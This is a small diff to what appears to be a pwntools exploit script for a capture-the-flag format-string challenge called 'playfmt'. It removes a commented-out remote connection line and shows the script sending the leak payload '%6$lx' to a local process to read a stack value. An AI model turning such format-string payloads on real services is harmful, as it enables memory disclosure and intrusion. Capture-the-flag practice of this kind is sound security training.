@@ -3,7 +3,6 @@ from pwn import *
 
 context.log_level="debug"
 p=process("./playfmt")
-#p=remote("123.206.21.178",10000)
 p.recvuntil("=\n")
 p.sendlineafter("=\n","%6$lx")
 s="0x"+p.recvuntil("\n")
